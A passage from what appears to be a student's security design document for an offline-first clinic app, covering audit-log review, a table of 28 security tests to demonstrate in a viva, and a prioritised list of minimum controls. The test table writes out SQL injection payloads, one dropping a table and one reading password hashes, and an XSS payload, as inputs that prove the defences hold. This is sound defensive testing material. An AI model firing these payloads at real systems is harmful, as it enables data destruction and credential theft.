| 4 | **Every `payment.void`** with its reason | Voids clustered on one cashier, or with thin reasons, or just before a reconciliation close |
| 5 | **Reconciliation variances** by cashier | A pattern of small shortfalls is the classic signature |
| 6 | **`auth.refresh.reuse_detected`** events | Each one is a potential token theft. Confirm the family revocation fired. |
| 7 | **`device.register` / `device.revoke`** | An unexpected new device is a red flag. A revoked device that re-registers without approval is a **control failure** — investigate immediately. |
| 8 | **Gaps in `audit_logs.id`** | The sequence is monotonic. A gap means rows were deleted. With the `phc_api` grants revoked (§6.5) this requires a privileged actor — which makes it more serious, not less. |
| 9 | **`audit.export` events** | Who exported what, and where did it go. Exports are the sanctioned leak path. |
| 10 | **`user.role.change` and `user.suspend`** | Verify each against an authorising request. Privilege changes are the highest-leverage action in the system. |
| 11 | **Sync anomalies** — backdated timestamps, `created_by`/`sub` mismatch, offline window exceeded (§8.3) | Tampering signals (T5) or a misconfigured device clock (T7). Either way, follow up. |
| 12 | **Record the review** | Who reviewed, when, what they found, what they did. An unreviewed audit log is a liability, not a control. |

---

## 12. Testing the security controls

A checklist of tests you can **run and demonstrate in a viva**. Each one is a small, concrete script or Playwright test. "I designed a control" is a claim; "here is the failing request and the 403" is evidence.

| # | Test | How to run it | Expected result | Control proven |
|---|---|---|---|---|
| 1 | **Offline login with a wrong password** | Playwright `context.setOffline(true)`, attempt login with a wrong password | Rejected. No session created. Attempt counter increments and escalates. | §3.4 — the verifier works and fails correctly |
| 2 | **Offline login with the right password, within the grace window** | `setOffline(true)`, correct password, `offline_deadline` in the future | Login succeeds; writes queue in the outbox; sync status shows offline | §3.4 |
| 3 | **Offline login after grace expiry** | Set the stored `offline_deadline` into the past, attempt login | Refused. App enters read-only mode. Write controls disabled. | §3.5 |
| 4 | **Device clock rollback** | Change the OS clock back 7 days with an expired deadline, then attempt offline login | Still refused; the deadline is compared against the server-issued value, not device wall-clock alone | T7 — clock manipulation does not extend the session |
| 5 | **Replay a captured sync request** | Capture a `POST /sync/push` (proxy or devtools "Copy as cURL"), replay it verbatim | `409 device_nonce_replayed` (or `401 device_timestamp_out_of_window` if delayed) | §4.4.1 |
| 6 | **Replay with a fresh nonce but the old body** | Modify only the nonce header | `401 device_signature_invalid` — the signature no longer matches the canonical string | §4.4 |
| 7 | **Tamper with a queued operation in IndexedDB, then sync** | In devtools, edit an outbox entry's payload (e.g. change a dispense quantity or `amount_minor`), then trigger a push | Two possible outcomes, both acceptable: (a) the signature fails because the body hash changed; (b) the signature passes but server-side validation rejects the value. **Record which one happens and why** — this is a great viva discussion. | §4.4 + §8.3 |
| 8 | **Tamper with a *synced* record locally** | Edit a patient row in IndexedDB directly, no outbox entry | Local UI shows the lie; the server is unaffected; the next pull overwrites it. **Demonstrates why the server is the authority.** | §5.5, §8.3 |
| 9 | **Forged `created_by` in a sync payload** | Push an operation with `created_by` set to another user's ID | `403` — mismatch with the JWT `sub`; audit anomaly written | T16, §8.3 #9 |
| 10 | **Client-side authorisation bypass** | With a `cashier` token, `curl` a `doctor`-only endpoint (`POST /referrals`) | `403` from the service layer, audit `authz.denied` written. **Not** a 200 with a hidden UI button. | T18, §5.5 |
| 11 | **Every wrong-role pair** | A table-driven test iterating role × capability, asserting 403 where the matrix says None | All pass. Fail the build if a route exists with no declared capability. | §5.3, deny-by-default |
| 12 | **Expired referral link** | Create a referral, set `expires_at` into the past, open `/r/:token`, submit the correct PIN | Generic failure. `referral_access_log` records `expired_attempt`. | §7.6 |
| 13 | **Wrong PIN six times** | Submit five wrong PINs, then the correct one | Sixth attempt fails even with the correct PIN — hard lockout. `pin_locked_at` set; `referral_access_log` shows `pin_failed` ×5 then `denied`. | §7.5 |
| 14 | **Referral token enumeration** | Request `/r/<random-32-byte-token>` repeatedly | Every request fails; no timing or error-message difference between "unknown token" and "expired token" | §7.2, §7.5 |
| 15 | **Argon2id DoS ordering** | Send 100 requests to `/r/:token` with **invalid** tokens and time the responses | Rejected in microseconds, no Argon2id work, CPU stays flat. Then compare with 100 **valid-token** PIN attempts, which are visibly slower and bounded by the semaphore. | T17, §9.3 |
| 16 | **SQL injection in a search field** | `'; DROP TABLE patients; --`, `%' UNION SELECT password_hash FROM users --`, and a blind boolean `CASE` payload in a sort parameter | Parameterised queries neutralise all of them: the first two return no results, the third is rejected by the sort allow-list. Verify the `patients` table still exists. | T9, §8.1 |
| 17 | **XSS via a patient name** | Register a patient with first name `<img src=x onerror="alert(document.domain)">`, then view every screen that renders it, plus the print view and the referral public page | Rendered as literal text everywhere. No alert. The CSP blocks an injected inline script if you manage to get one in. | T10, §8.2 |
| 18 | **Using a revoked device key** | Sign a valid push with a device key, revoke the device, replay the push with a fresh nonce and timestamp | `403 device_revoked_or_unknown`. The user can still log in on another device. | §4.5 |
| 19 | **Revoked device re-registration** | On the revoked device, attempt `POST /devices/register` with the same `device_id` | Rejected — requires admin approval. Without this, revocation is bypassable by one click. | §4.5 |
| 20 | **Reuse of a rotated refresh token** | Refresh, then present the **old** refresh token again | `401`, and the **entire family** is revoked — verify the new token also stops working | §3.3 |
| 21 | **CSRF attempt** | A page on another origin auto-submits a form to the API | No effect: the browser does not attach `Authorization`, and CORS blocks the read | T11 |
| 22 | **CORS misconfiguration** | `curl -H "Origin: https://evil.example" ...` on a mutation | No `Access-Control-Allow-Origin` for the disallowed origin | §10.5 |
| 23 | **Audit-log immutability** | As `phc_api`, run `UPDATE audit_logs SET action='x'` and `DELETE FROM audit_logs WHERE id=1` | Both fail with a permission error | §6.5 |
| 24 | **Audit log is not synced** | Inspect every Dexie table and the `GET /sync/pull` payload | `audit_logs` appears nowhere | Architecture §5 |
| 25 | **Double payment submission** | Submit the same payment operation twice with the same operation ID, and again with the same `receipt_number` but a new operation ID | One payment recorded. Second reports `duplicate`. Derived balance is correct. | T8 |
| 26 | **Un-synced data visibility** | Go offline, create five records, inspect the sync status panel | "5 unsynced records, oldest 2 minutes" — and the count decrements after reconnect | T12 |
| 27 | **Logout wipes the replica** | Log out, then inspect IndexedDB | Empty (or only non-clinical keys, per the configured policy). No patient rows, no `local_credentials`. | §3.6 |
| 28 | **Restore from backup** | Restore a Neon branch to a point in time, verify a known record is present | Restore succeeds within the documented RTO | §10.2 — and it is the test most students skip |

**How to present these:** group them into a single `make security-test` target or a Playwright spec file, run it live in the viva, and have the audit-log output on screen next to it. The audit log is the artifact that proves the controls fired — tests 10, 13, and 18 are much more convincing when you show the corresponding `audit_logs` and `referral_access_log` rows alongside the HTTP response.

---

## 13. Minimum viable security for the viva

Under deadline pressure, you will not build all of this. If you build only ten things, build these — in this order. Each one is small, each one is demonstrable, and together they cover the threats that would actually end your project.

| # | Control | Where | Why it is non-negotiable | Effort |
|---|---|---|---|---|
| 1 | **Service-layer RBAC with a deny-by-default capability matrix** | `internal/service/authz.go` | With a fully replicated offline client, this is the *only* authorisation boundary. Without it you have no access control at all — just an access-control-shaped UI. | 1 day |
| 2 | **Parameterised SQL via pgx, everywhere, with a sort allow-list** | `internal/repo/` | One concatenation undoes the entire security story, and the sync payload is attacker-controlled. | 2 hours |
| 3 | **Argon2id for passwords, with parameters stored alongside the hash** | `internal/platform/argon2/` | Storing a fast hash of a password is the finding that fails a security module. | 3 hours |
| 4 | **JWT + rotating refresh token with reuse detection and family revocation** | `internal/service/auth.go` | Reuse detection is the difference between "a token was stolen" and "a session was hijacked indefinitely". | 1 day |
| 5 | **Offline verifier derived with a device-local salt — never the plaintext password, never the server's hash** | `web/src/db/localCredentials.ts` | Storing the server's hash locally is a credential-equivalent leak; storing the plaintext is worse. | 4 hours |
| 6 | **ECDSA P-256 device keypair, device signature on `/sync/push`, and per-device revocation** | `web/src/sync/deviceKey.ts` + device middleware | This is the *justification* for the offline architecture. It is the answer to "what happens when the laptop is stolen?" and the most interesting thing in your report. | 1–2 days |
| 7 | **Referral: 256-bit token, SHA-256 at rest, Argon2id PIN, expiry in the SQL query, 5-attempt lockout, access log** | `internal/service/referral.go` | The referral feature is the headline requirement and the only unauthenticated data path. Every element is load-bearing (§7.1). | 1–2 days |
| 8 | **Append-only `audit_logs` with `UPDATE`/`DELETE` revoked from the API role** | migration `0009_audit_grants.sql` | The audit log is your evidence for every other control, including in tests 10, 13, and 18. | 3 hours |
| 9 | **Strict CSP, no third-party scripts on the app origin, and no `dangerouslySetInnerHTML`** | `index.html` + `vite.config.ts` | The origin holds every patient record. One third-party script is a full breach; one XSS is a full replica exfiltration. | 3 hours |
| 10 | **Full-disk encryption verified and recorded, plus a ≤5-minute screen lock** | §10.7 checklist | It is the highest-value control in the document and it is *not code*. If you skip everything else on the client side, do not skip this. | 1 hour per device |

**If you have one more day, add:** the rate limits in §9.1 (particularly the account+IP login pair and the referral PIN lockout), and test #5 (replay a captured sync request) — a single demonstrated replay rejection is the most impressive thing you can show an examiner.

**What you can safely leave out and *say* you left out:** column-level encryption (§6.7), the audit hash chain (§6.5), remote wipe (§3.6), MDM, antivirus scanning of uploads (§8.4), and per-category retention automation. For each one, name the residual risk and the production answer. **A documented, reasoned omission reads as engineering judgement. An undocumented gap reads as an oversight.** That distinction is worth more marks than any single control in this document.
